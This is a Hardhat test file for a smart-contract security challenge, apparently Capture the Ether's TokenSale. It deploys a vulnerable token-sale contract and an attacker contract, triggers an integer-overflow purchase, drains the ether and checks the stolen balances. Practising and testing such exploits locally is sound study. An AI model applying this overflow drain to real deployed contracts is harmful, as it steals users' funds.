const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");
const { BigNumber } = ethers;
const helpers = require("@nomicfoundation/hardhat-network-helpers");

describe("TokenSaleChallenge", function () {
  async function deployOneYearLockFixture() {
    const [deployer, user1] = await ethers.getSigners();

    //deploy TokenSale Contract
    const TokenSaleChallenge = await ethers.getContractFactory(
      "TokenSaleChallenge"
    );
    const contractTokenSale = await TokenSaleChallenge.deploy({
      value: ethers.utils.parseEther("1"),
    });
    await contractTokenSale.deployed();

    //deploy attacker contract
    const Attacker = await ethers.getContractFactory("AttackTokenSale");
    const contractAttacker = await Attacker.deploy(contractTokenSale.address);
    await contractAttacker.deployed();

    provider = ethers.provider;

    return { contractTokenSale, contractAttacker, provider, deployer, user1 };
  }

  it("ContractToken has 1 ether from deployment & attacker 0 ether", async () => {
    const { contractTokenSale, contractAttacker, provider } = await loadFixture(
      deployOneYearLockFixture
    );
    //ether balance of tokenContract is 1 ether
    const balanceOfToken = await provider.getBalance(contractTokenSale.address);
    expect(balanceOfToken).to.be.equal(
      new BigNumber.from(ethers.utils.parseEther("1"))
    );

    //ether balance of tokenAttacker is 0 ether
    const balanceOfAttacker = await provider.getBalance(
      contractAttacker.address
    );
    expect(balanceOfAttacker).to.be.equal(
      new BigNumber.from(ethers.utils.parseEther("0"))
    );
  });

  it("Setup and attack", async () => {
    const { contractTokenSale, contractAttacker, provider, user1 } =
      await loadFixture(deployOneYearLockFixture);

    //check balanceOf(contractAttacker) is 0 tokens
    const balanceAttackerBefore = await contractTokenSale.balanceOf(
      contractAttacker.address
    );
    expect(balanceAttackerBefore).to.be.equal(
      new BigNumber.from(ethers.utils.parseEther("0"))
    );

    //buy overflow tokens from attacker
    const buyTx = await contractAttacker
      .connect(user1)
      .buy({ value: ethers.utils.parseEther("1") });
    await buyTx.wait();

    //withdraw tokens (steal the tokens) from the tokenSale
    const stealTx = await contractAttacker.connect(user1).attack();
    await stealTx.wait();

    //check balanceOf(contractAttacker) is OVERFLOW tokens
    const balanceAttackerAfter = await contractTokenSale.balanceOf(
      contractAttacker.address
    );
    expect(balanceAttackerAfter).to.be.above(
      new BigNumber.from(ethers.utils.parseEther("1000"))
    );

    //check ether balance of the contractAttacker (stole around 0,5eth)
    const ethBalanceOfAttacker = await provider.getBalance(
      contractAttacker.address
    );
    expect(ethBalanceOfAttacker).to.be.above(
      new BigNumber.from(ethers.utils.parseEther("1"))
    );
  });
});
